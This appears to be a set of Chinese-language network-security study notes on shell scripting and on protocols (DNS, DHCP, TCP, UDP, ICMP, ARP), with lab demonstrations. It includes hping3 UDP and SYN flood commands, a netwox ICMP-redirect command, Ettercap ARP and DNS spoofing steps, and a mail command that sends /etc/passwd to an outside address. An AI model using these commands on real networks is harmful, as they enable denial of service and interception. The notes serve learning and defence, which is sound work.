![image-20230408213006439](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230408213006439.png)\n\n- 关于参数的判断语句\n\n  ```shell\n  if [ \"$#\" -ne 1 ]; then\n  echo \"参数错误，输入过多 或者未输入参数\"\n  exit 1\n  fi\n  \n  if [ -e \"$filename\" ]; then \n  grep -n \"root\" $filename\n  else\n  echo \"文件不存在\"\n  exit 1\n  fi\n  ```\n\n  注意[] 前后的空格 $ 必须加引号\n\n  关于判断文件以及目录的参数\n\n  ```shell\n  -e filename     如果 filename 存在，则为真            [ -e /var/log/syslog ]\n  -d filename     如果 filename 为目录，则为真          [ -d /tmp/mydir ]\n  \n  -f filename     如果 filename 为常规文件，则为真      [ -f /usr/bin/grep ]\n  \n  -L filename     如果 filename 为符号链接，则为真      [ -L /usr/bin/grep ]\n  \n  -r filename     如果 filename 可读，则为真            [ -r /var/log/syslog ]\n  \n  -w filename     如果 filename 可写，则为真            [ -w /var/mytmp.txt ]\n  \n  -x filename     如果 filename 可执行，则为真          [ -L /usr/bin/grep ]\n  \n  -s filename     如果 filename 长度不为零，则为真          [ -s /usr/bin/grep ]\n  ```\n\n- 引号\n\n  \n\n  - 双引号 变量会被引用\n\n  - 单引号，变量不会被引用\n\n  - 反引号，把里面的内容当作一个命令\n\n    ```shell\n    # 引号相关\n    \n    echo \"环境变量的路径： $PATH\"\n    echo '环境变量的路径： $PATH'\n    echo `date \"+%Y-%M-%D\"`\n    #output \n    环境变量的路径： /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin\n    环境变量的路径： $PATH\n    2023-10-04/08/23\n    ```\n\n- $? 非零代表上一条命令失败\n\n- $0 代表脚本的名称，$1 是第一个参数\n\n- $@ 和$* 返回脚本的参数，前者是多个字符串，或者是一个字符串\n\n- expr 数字命令  必须有空格，不能处理小数\n\n  ```shell\n  [root@192 ~]# expr 10+20\n  10+20\n  [root@192 ~]# expr 10 + 20\n  30expr 10 + 10\n  ```\n\n- 逻辑运算\n\n  - a  与\n\n  - -o 或\n\n  - !  非\n\n- 字符串\n\n  - -z  为空字符串\n\n  - -n 为非空字符串\n\n    ```shell\n    [root@192 ~]# [ -z $xxx ]\n    [root@192 ~]# echo $?\n    1\n    [root@192 ~]# [ -n $xxx ]\n    [root@192 ~]# echo $?\n    0\n    [root@192 ~]# echo $xxx\n    12345\n    ```\n\n- 数值比较\n\n  - ```shell\n    -eq   数值相等\n    \n    -ne  数值不等\n    \n    -le  小于等于\n    \n    -ge 大于等于\n    \n    -gt 大于\n    \n    -lt 小于\n    ```\n\n- 循环语句\n\n  ```shell\n  - #!/usr/bin/bash\n    # for \n    sum=0\n    for i in {1..100}; do\n       #sum=`expr $sum + $i`\n       #let sum=sum+i\n       ((sum=sum+i))\n    done\n    echo \"$sum\"\n    while []; do\n    \txxxx\n    done\n   \n  # 后面那个1是步长,双圆括号用在这很好\n  #for i in {1..100..1}; do\n  for ((i=0;i<=100;i++)); do\n     let sum+=i\n  done \n  echo \"sum is $sum\"\n   \n  # while\n  #!/usr/bin/bash\n  i=0\n  sum=0\n  while [ $i -lt 10 ]; do\n      let sum=sum+i\n      let i++\n  done\n  echo \"$sum\"\n  ```\n\n- 函数\n\n  ```shell\n  - function add(){\n    let sum=$1+$2 # 参数取值方式\n    echo \"$sum\"  # 相当于返回值\n    }\n    #result=$(add 100 200)\n    result=`add 100 200`  #两种赋值方式\n    echo $result\n  \n  ```\n\n  关于括号的一些用法\n\n  - (()) 双圆括号，用于运算，可以替代expr，数学运算\n  \n    ```shell\n    line=1\n    ((line+=3))\n    echo $line  # 4\n    ```\n  \n    \n  \n  - ${} 可以去特定参数或变量的值 ${1}\n  \n  - $() 可以代替反引号执行圆括号中的命令\n  \n  - $[] 用于整数运算，也可以代替expr\n\n​\t\t示例 用了阶乘\n\n```shell\nfunction jiecheng(){\n   sum=1\n   for ((i=1;i<=$1;i++)); do\n       let sum=sum*$i\n       #echo $sum \n   done\n   echo $sum\n}\nif [ $# != 1 ];then\n   echo \"usage jiecheng number\"\n   exit 1\nfi\nresult=$(jiecheng $1)\necho $result\n```\n\n- 数组的操作\n\n  ```shell\n  declare -a weekday\n  # 数组下标默认从1开始\n  # 单个赋值\n  weekday[1]=Monday\n  weekday[2]=Tuesday\n  weekday[3]=xxx\n  #整体赋值\n  weekday={Monday Tuesday xxx}\n  #全部输出\n  echo ${weekday[@]}\n  #按照下标输出\n  echo ${weekday[1]}\n  #单个输出\n  for day in ${weekday[@]};do\n      echo $day\n  done\n  # 修改\n  weekday[1]=qwer\n  echo ${weekday[1]}\n  # 取数组个数\n  echo \"数组的个数是 ${#weekday[@]}\"\n  \n  \n  #\n  len=${#weekday[@]}\n  echo $len\n  for ((i=1;i<=$len;i++)); do\n      echo \"${weekday[$i]}\"\n  done\n  ```\n\n\n- 字符串处理\n\n  1、删除字符\n\n  - #*// 从左边开始删除第一个// 及其左边的内容\n  - ##*/ 从左边开始，删除最后一个/ 及其左边的内容\n  - %/*  从右边开始，删除第一个/ 及其右边的内容\n  - %%/* 从右边开始，删除最后一个/及其右边的内容\n  - ![](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230412214344410.png)\n\n​\t\t\t![image-20230412214344410](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230412214344410.png\n\n- ​\t取字符\n\n  - ${str:start:substrlen}\n\n    ```shell\n    phone=\"13109097878\"\n    echo ${phone:0:5} # 表示从第一个开始取5个字符串\n    echo ${phone:2:5} # 表示从第3个开始取5个字符串\n    echo ${phone:0-5:3} # 表示从倒数第五个开始取3个字符\n    echo ${#phone} # 取字符串的长度\n    \n    ```\n\n  - awk 的使用\n\n    ```\n    awk 选项 处理逻辑 文件\n    echo \"Hello Woniuxy Welcome Chengdu\" |awk '{print $2}' # 默认按照空格隔开后的第二列的内容\n    Woniuxy\n    \n    echo -e \"Hello Woniuxy Welcome Chengdu\\nA B C D\" |awk '{print $2}' #\\n 就分成了两行，然后会输出每一行的第二列的内容\n    Woniuxy\n    B\n    \n    echo 'http://www.woniuxy.com//index.html' |awk -F '.' '{print $2}'   #用. 作为分隔符\n    \n    echo 'http://www.woniuxy.com//index.html' |awk -F '[/.]' '{print $2}'   #用/. 两个都作为分隔符\n    \n    ping www.baidu.com -c 2   |awk -F [\\(\\)] '{print $2}'  # 输出以() 分割的第二列的内容，可以获取IP地址\n    PING www.baidu.com (39.156.66.18) 56(84) bytes of data.\n    64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=1 ttl=51 time=39.9 ms\n    64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq=2 ttl=51 time=39.4 ms\n    \n    awk -F : '$1，~/正则表达式/ {print $1}' /etc/passwd   # 输出第一列包含root的以:分割的第一列的内容，~/正则表达式/\n    \n    ```\n\n  \n  - sed 的使用\n  \n    - -i  永久修改文件   后续的都是直接显示，但是不会写入到文件\n  \n    - -n 显示处理后的结果\n  \n      ```shell\n      # 显示处理后的结果，/root/p 搜索并打印含有root的行，如果改成d 就是搜索并删除含有root的行\n      [root@192 ~]# sed -n  '/root/p' test.txt   \n      root:x:0:0:root:/root:/bin/bash\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n      \n  \n    - a 新增  在后面新增新行\n  \n      ```\n      [root@192 ~]# sed '5a hello world' test.txt   #在第五行后面新增数据\n      root:x:0:0:root:/root:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      hello world\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      \n      ```\n  \n    - d 删除\n  \n      ```\n      [root@192 ~]# sed '6d' test.txt   #删除第六行\n      root:x:0:0:root:/root:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n    - i 插入，在前面插入 新行\n  \n      ```\n      [root@192 ~]# sed '5i hellword' test.txt   # 在第五行前面新增一行数据helloword\n      root:x:0:0:root:/root:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      hellword\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n    - c  取代\n  \n      ```\n      [root@192 ~]# sed '1c hellword' test.txt  # 按行替换，替换第一行为helloworld\n      hellword\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/root:/sbin/nologin\n      ```\n  \n    - sed 's/root/xxxx/g'  搜索root 替换为xxx , g 代表全局替换，不加则表示替换找到的第一个\n  \n      ```\n      [root@192 ~]# sed 's/root/xxxxx/g' test.txt \n      xxxxx:x:0:0:xxxxx:/xxxxx:/bin/bash\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/xxxxx:/sbin/nologin\n      ```\n  \n    - -e 多点编辑\n  \n      ```\n      [root@192 ~]# sed -e  's/root/xxxx/g' -e '1c hellword' test.txt\n      hellword\n      bin:x:1:1:bin:/bin:/sbin/nologin\n      daemon:x:2:2:daemon:/sbin:/sbin/nologin\n      adm:x:3:4:adm:/var/adm:/sbin/nologin\n      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin\n      sync:x:5:0:sync:/sbin:/bin/sync\n      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown\n      halt:x:7:0:halt:/sbin:/sbin/halt\n      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin\n      operator:x:11:0:operator:/xxxx:/sbin/nologin\n      ```\n  \n    \n    - 实战监控CPU\n    \n      ```shell\n      # 查找消耗CPU超过25%的进程并Kill\n      cpu=$(top -n 1 | grep \"%Cpu\" |awk '{print $8}'|awk -F . '{print $1}')\n      if [ $cpu -lt 75 ] ; then\n         pid=$(top -n 1| grep root |head -n 1|awk '{print $2}')\n         echo \"占用CPU资源最多的进程ID是\"$pid\n         filename=$(ls -l /proc/$pid/exe|awk -F '->' '{print $2}')\n         echo “进程路径为”$filename\n         kill -s 9 $pid\n         if [ $? -eq 0 ] ; then\n            echo \"进程已经kill\"\n         fi\n      fi\n      ```\n    \n      \n    \n    - 邮件配置  \n    \n      软件 mailx \n    \n      编辑/etc/mail.rc\n    \n      加入\n    \n      ```\n      set from=zwjscu@qq.com\n      set smtp=smtp.qq.com\n      set smtp-auth-user=zwjscu@qq.com\n      set smtp-auth-password=xxxx(授权码)  去对应的邮箱找\n      set smtp-auth=login\n      \n      运行命令\n      mail -s \"test\" 2194620553@qq.com </etc/passwd\n      \n      # 失败注意安装sendmail\n      yum install sendmail\n      ```\n    \n      ![image-20230417223525208](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230417223525208.png)\n    \n      \n\n​\t\t\t\n\n\n\n​\t\t\t","tags":["网络安全"],"categories":["网络安全"]},{"title":"Windows防火墙","url":"/2023/04/05/Windows防火墙_new/","content":"\n            \n### windows 防火墙\n\n1、包过滤防火墙\n\n- 判断信息-五元组\n- 工作范围  3-4层\n\n2、应用代理\n\n较大程度地隔绝通信两端的直接通信，所有通信都要由应用层代理层转发,访问者不允许与服务器建立直接的TCP连接，应用层的协议会话过程必须符合代理的安全策略要求。\n\n- 判断信息：应用层数据\n- 工作范围：应用层\n\n3、状态监测防火墙 ASPF\n\n- TCP编辑，IP地址，端口\n- 2-4层\n\n4、WAF \n\n- http协议数据（request response）\n- 应用层\n\n5、多合一网关\n\n- FW IDS IPS AV\n- 2-7\n\n6、下一代防火墙（NGFW）\n\n- FW IDS IPS AV WAF\n\n7 、windows 防火墙\n\nnetsh advfirewall /?\n\n![image-20230405153535345](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230405153535345.png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"邮件协议","url":"/2023/03/31/邮件协议_new/","content":"\n\n### 邮件协议\n\n1、邮件协议\n\n- SMTP：简单邮件传输协议，TCP端口号25，主要用于发送电子邮件\n\n  SMTP代表Simple Mail Transfer Protocol。SMTP用于发送电子邮件并将其路由到正确的目标服务器（或邮箱）。SMTP服务器提供从邮件客户端（例如Microsoft Outlook、Gmail等）发送电子邮件所需的服务。当你发送一封电子邮件时，SMTP服务器接收该邮件，检查发送者是否有权访问该邮件，并将其传递到邮件接收服务器。SMTP是向外发送电子邮件的标准协议。\n\n  \n\n- POP3：邮局协议第三版，默认TCP端口号110号，主要用于接收电子邮件\n\n  POP3是用于从邮件服务器上检索电子邮件的一种协议。使用POP3协议时，用户在邮件客户端上对本地邮件的操作（如，删除、转移至其它文件夹等）不会影响服务器上的邮件。但如果用户未勾选“在服务器上保留邮件的副本”时，不同的邮件客户端看到的本地邮件将会有所不同。\n\n  \n\n- IMAP4：网际消息访问协议第四版，默认端口号143号，主要用于在线查看邮件（接收邮件)\n\n  使用IMAP协议时，用户在某个邮件客户端上的操作，将会被“映射”到邮件服务器上。因此，使用IMAP协议，可以同时保持多个邮件客户端上邮件的同步。\n\n  \n\n2、常见电子邮件系统\n\n- exchange\n- postfix\n- 第三方（qq,163）\n\n3、邮件客户端\n\n- foxmail\n- outlook\n- 网易邮箱大师\n- QQ邮箱k\n\n4、wireshark 抓包\n\n可以尝试抓到明文用户名，密码，内容\n\npop3  : 从邮件服务器拉取邮件，删除后不影响邮件服务器\n\n![image-20230404211806927](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230404211806927.png)\n\nIMAP：删了就是删了\n\n![image-20230404211855826](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230404211855826.png)","tags":["网络安全"],"categories":["网络安全"]},{"title":"HTTP","url":"/2023/03/29/HTTP_new/","content":"\n            \n\n\n### HTTP协议-HTTPS\n\n#### 1、HTTP\n\n- 超文本传输协议，默认端口80，基于TCP\n- http是无连接的，限制每次连接只处理一个请求\n- http是无状态的，没有记忆能力\n\n#### 2、HTTPS\n\n- https = http + ssl/tls\n\n- 在http的通道上增加了安全性，传输过程中通过加密和身份验证来确保传输安全性。\n\n- tls\n\n  传输层安全协议，SSL和tls其实是一个协议，SSL 2.0版本自SSL3.0版本以后更名为TLS1.0，目前最高TLS1.3，最广泛应用的是TLS1.2。\n\n- 传输之前，client和server 协商数据传输过程中的加密算法，包含非对称加密的密钥交换算法（RSA），数据签名摘要算法（MD5，sha），对称加密算法（DES/AES ）\n- 客户端生成随机的字符串，通过协商好的非对称加密算法，使用服务端的公钥对该字符串进行加密，发送给服务端。服务端收到后，使用自己的私钥进行解密得到该字符串，随后的数据传输中，使用这个字符串作为密钥进行对称加密。\n\n![image-20230329222217626](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230329222217626.png)\n\n3、PKI\n\n- 数字签名\n\n  ![image-20230329223947617](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230329223947617.png)\n\n4、完整的过程\n\n![image-20230329225150730](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230329225150730.png)","tags":["网络安全"],"categories":["网络安全"]},{"title":"FTP","url":"/2023/03/28/FTP_new/","content":"\n            \n### FTP协议\n\n1、概念\n\n- 文件传输协议，CS架构，基于TCP，默认端口号20，21\n\n-   主动模式\n\n  ![image-20230328231152827](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230328231152827.png)\n\n- 被动模式\n\n  ![image-20230328231118733](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230328231118733.png)\n\n2、软件\n\n- 服务器软件\n  - serv-U\n  - filezilla server\n  - vsftpd\n  - IIS\n\n- 客户端\n  - ftp serverIP\n  - 资源管理器  ftp://192.168.10.10\n  - 浏览器  ftp://server_ip\n  - 第三方工具\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"DNS","url":"/2023/03/26/DNS_new/","content":"\n            \n###  DNS 协议\n\n1、概念\n\n- DNS记录\n  - A   : 主机记录，域名和IP的映射\n  - CNAME ： 别名\n  - SOA：权威名称服务器\n  - NS：名称服务器\n  - MX：邮件交换记录\n  - SRV： 正在提供服务的\n  - PTR:  反向指针\n\n2、DNS查询\n\n- 客户机访问www.baidu.com，根据自己的TCP/IP参数，向自己的首选DNS服务器发送DNS请求\n\n- 首选DNS服务器收到客户机的请求后，去查询自己的区域文件，找不到IP地址信息（将请求转发给根域服务器）；直接可以找到，则返回IP地址\n- 根域服务器收到请求后，由于根域服务器只维护顶级域服务器，会响应顶级域名服务器IP（com）,首选DNS根据根域名服务器响应的信息，将请求转发到com顶级域\n- com顶级域收到请求，由于com顶级域只维护二级域信息，会响应二级域服务器IP，首选DNS根据顶级域响应的信息，将请求转发到baidu.com 二级域\n- baidu.com 二级域收到请求，baidu.com DNS服务器里面维护的是baidu.com 区域内的所有主机信息，包含了www.baidu.com的信息，将IP地址响应给首选DNS\n- 首选DNS响应给主机。   \n\n![image-20230327213240915](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327213240915.png)\n\n3、 DNS配置 缓存DNS服务器 \n\n- server2016上安装DNS服务，配置转发器\n\n  ![image-20230327223920382](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327223920382.png)\n\n- 将另一台主机DNS服务器设置为server2016的IP，随后nslookup 查询特定域名\n\n- wireshark抓包\n\n  ![image-20230327224042516](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327224042516.png)\n\n- server2016这个缓存DNS服务器向转发器中的DNS服务器（192.168.10.1）转发DNS请求，192.168.10.1请求到以后，返回给server2016，server2016再响应client。\n\n  \n\n4、 DNS攻击\n\n环境：\n\nkali   192.168.101.8  攻击机器\n\nserver2016  web服务器  192.168.101.6 提供web界面\n\nwin10  192.168.101.11  被攻击的主机\n\n工具  Ettercap\n\n\n\n- 修改/etc/ettercap/etter.dns  格式 要欺骗的域名 A + 目标IP\n\n   ![image-20230327231322145](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231322145.png)\n\n- 配置Ettercap，打开后扫描主机进行arp欺骗\n\n  选择目标主机以及网关add to Target，随后点击ARP poisoning , 随后选择dns_spoof 进行欺骗。\n\n  ![image-20230327231418945](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231418945.png)\n\n![image-20230327231509695](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231509695.png)\n\n![image-20230327231539501](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231539501.png)\n\n![image-20230327231033145](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230327231033145.png)\n\n最后在目标主机访问woniu.com 被修改成了192.168.101.6 的web页面。","tags":["网络安全"],"categories":["网络安全"]},{"title":"DHCP","url":"/2023/03/23/DHCP_new/","content":"\n            \n### DHCP协议\n\n1、DHCP的工作原理\n\n- 动态主机配置协议，主要给客户机提供TCP/IP参数（IP地址、子网掩码、网关、DNS）\n- 好处\n  - 减少管理员的工作量\n  - 减少出错的可能，避免输入错误\n  - 避免IIP冲突\n  - 提高IP地址利用  \n\n- 应用层协议，基于UDP，端口号67，服务器响应给客户机的68号端口，客户机与服务器的交互过程\n\n  - dhcp discover  客户机 发送 ，以广播方式，网络中所有的DHCP服务器都会受到并响应 ，客户向受到的第一个offer报文的服务器发送request请求\n  - dhcp offer dhcp 服务器发送的提供报文\n  - dhcp request client 发送的request请求\n  - dhcp ack  服务器确认，客户机获得IP参数 \n\n  ![image-20230323204319729](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323204319729.png)\n\n  除了以上的还有四种报文\n\n  - dhcp release\n  - dhcp nak: 针对request 的拒绝报文\n  - dhcp decline：当客户端发现接收到IP冲突时，发送此报文给服务器\n  - dhcp inform：已经有IP地址，获取其他的配置信息，如网关，DNS等 \n\n2、windows server 部署\n\n如图的拓扑结构，R1上需要在f0/0接口配置dhcp中继，VM1才能请求到DHCPserver 分配的IP地址。 \n\n如图 DHCP server 配置了两个dhcp 作用域，50和120网段\n\n![image-20230323214149891](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323214149891.png)\n\n\n\n3、抓流量 \n\n- 示例1，释放vmnet1 的地址来抓包，查看这个过程\n\n```\nipconfig /release  \"VMware Network Adapter VMnet1\"\nipconfig /renew  \"VMware Network Adapter VMnet1\"\n```\n\n![image-20230323205013933](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323205013933.png)\n\n\n\nclient获取IP地址是一直在发广播报文： \n\n![image-20230323205412576](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323205412576.png)\n\n\n\ndhcp server 则是发的单播报文\n\n![image-20230323205457859](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323205457859.png)\n\n4、 DHCP欺骗\n\n攻击DHCP，发送discover 报文使得DHCP服务器的IP被耗尽，从而无法提供服务。\n\n使用的工具是 yersinia, 可以攻击DHCP服务器使得IP被耗尽，随后伪造一个DHCP服务器。\n\n攻击的拓扑结构\n\n![image-20230324215603531](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230324215603531.png)\n\n5、DHCP防御\n\n- 在交换机上配置信任端口\n\n  - 开启DHCP监听\n\n    ```powershell\n    ip dhcp snooping\n    ```\n\n  - 指定监听vlan\n\n    ```powershell\n    ip dhcp snooping vlan1\n    ```\n\n  - 由于开启监听后，交换机上的所有端口都变成非信任端口，会拒绝所有DHCP报文，需要将正常的接口配置为信任端口\n\n    ```powershell\n    int f0/1\n    ip dhcp snooping trust\n    ```\n\n  ","tags":["网络安全"],"categories":["网络安全"]},{"title":"UDP","url":"/2023/03/23/UDP_new/","content":"\n            \n### UDP协议\n\n- 特点\n\n  不需要连接，直接发送数据，不会重新排序，也不需要确认\n\n- 报文字段\n  - 源端口\n  - 目的端口\n  - length\n  - checksum\n  - stream index \n  - timestamps\n  - udp payload\n\n- 常见UDP\n  - DNS 53\n  - ntp  123\n  - tftp 69\n  - rpc 111\n  - snmp 161\n\n- udp 攻击\n\n  ```powershell\n  hping3 -q -n --rand-source --udp -p 53 --flood 192.168.198.135 -d 10000\n  ```\n\n  ![image-20230323202403665](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323202403665.png)","tags":["网络安全"],"categories":["网络安全"]},{"title":"tcp","url":"/2023/03/23/tcp_new/","content":"\n            \n### TCP协议\n\n- tcp字段\n\n![image-20230323160711404](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323160711404.png)\n\n- 三次握手\n\n  ![image-20230323161445330](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323161445330.png)\n\n  wireshark 抓包情况如下，第一次SYN=1 seq=391720034, 第二次SYN=1 ACK=1 seq = 3010721076 ack= 391720035, 第三次 ACK=1, seq=391720035 ack = 3010721077, 第二次的seq是一个随机数，ack=第一次seq+1, 第三次的seq=第二次的ack，ack= 第二次的seq+1\n\n  ![image-20230323171451595](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171451595.png)\n\n  ![image-20230323171545209](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171545209.png)\n\n  ![image-20230323171639573](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171639573.png)\n\n  ![image-20230323171707687](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323171707687.png)\n\n- 四次挥手\n\n  \n\n![image-20230323163146327](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323163146327.png)\n\n- tcp 半关闭状态\n\n- tcp半连接状态\n\n  客户端syn，服务器syn, ack ,客户端不继续ack\n\n  - syn flood Ddos\n\n    ```powershell\n    hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 192.168.198.135\n    ```\n\n    ![image-20230323194158066](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323194158066.png)\n\n  \n\n- ddos 防御\n\n  - tcp代理\n\n  - tcp源探测\n\n    回复伪造的syn+ack，然后如果client 发送RST，则说明是正常的包放行\n\n    ![image-20230323200541055](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323200541055.png)\n\n  - TCP连接数量限制","tags":["网络安全"],"categories":["网络安全"]},{"title":"ICMP协议","url":"/2023/03/20/ICMP协议_new/","content":"\n            \n### ICMP协议\n\n1、理解ICMP协议\n\n- Internet 控制报文协议，用于在IP主机、路由器之间传输控制信息，控制消息指的是网络通不通，主机是否可达，路由是否可用等。\n\n- ICMP基本概念\n\n  - 网络层协议，封装在网络层和传输层之间\n\n    ![image-20230321232207781](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230321232207781.png)\n    \n    ![image-20230321231850530](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230321231850530.png)\n\n2、理解ICMP重定向\n\n在某些特定情况下，路由器检测到主机使用非优化路由时候，会向主机发送一个ICMP重定向的报文，使得主机的路由改变。\n\n- 重定向攻击\n\n  - kali上使用工具实施ICMP重定向网关\n\n    ```powershell\n    netwox 86 -g 192.168.198.128  # 把网络中的网关修改为192.168.198.128\n    ```\n\n    \n\n3、会使用wireshark分析ICMP重定向\n\n实验条件\n\nkaili 地址 192.168.198.128\n\nwin10地址 192.168.198.134\n\n ![image-20230323154737753](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323154737753.png)\n\n![image-20230323154939442](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323154939442.png)\n\n在kali上运行工具netwox ，伪装的网关是 192.168.198.128，随后在win10上ping www.baidu.com，接着wireshark可以看到如下结果：修改了网关地址为 192.168.198.128，但是网关随便修改成功，但是攻击失败，目标仍然可以上网，原因未知。\n\n![image-20230323155135888](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230323155135888.png)\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"arp协议","url":"/2023/03/20/arp协议_new/","content":"\n            \n### ARP协议\n\n#### 一、ARP协议\n\n将一个已知的IP地址解析为MAC地址，从而进行二层数据交互，是一个三层的协议，但是工作在二层，是一个2.5层协议。\n\n#### 二、工作流程\n\n1、两个阶段\n\n- ARP请求\n- ARP响应\n\n![image-20230320215353648](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320215353648.png)\n\n2、arp数据格式\n\n目的MAC地址：源MAC地址：帧的类型：ARP请求（硬件类型：协议类型：硬件地址长度：协议地址长度: Opcode：发送方MAC地址：发送方IP地址：目标MAC地址：目标IP地址   ）  \n\n![image-20230320220140891](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320220140891.png)\n\n\n\n![image-20230320220115823](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320220115823.png)\n\n3、arp 缓存\n\n- 目的是为了防止重复请求\n\n- 命令\n\n```\nARP -a  #查看所有IP地址和MAC地址对应 \narp -s IP MAC # 静态绑定\narp -d # 清除arp\n```\n\n4、ARP攻击以及欺骗\n\n- ARP 攻击\n\n  - 禁用网络服务   如下图所示，主机A无法通信 \n\n    - 伪造ARP应答报文，向被攻击主机响应虚假的MAC地址\n    - 当被攻击主机进行网络通信时，会将数据交给虚假的mac 地址进行转发，由于虚假的MAC地址不存在，造成被攻击主机无法访问网络\n\n    ![image-20230320221210037](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320221210037.png)\n\n- ARP欺骗\n  - 欺骗网关\n  \n    - 伪造arp应答报文，向被攻击主机和网关响应真实的MAC地址\n    - 当被攻击主机进行网络通信时，会将数据交给真实MAC地址（C）进行转发给网关，从而来截获被攻击主机的数据，被攻击主机可以进行网络通信\n  \n    ![image-20230320221606799](https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230320221606799.png)\n  \n  - 欺骗主机\n  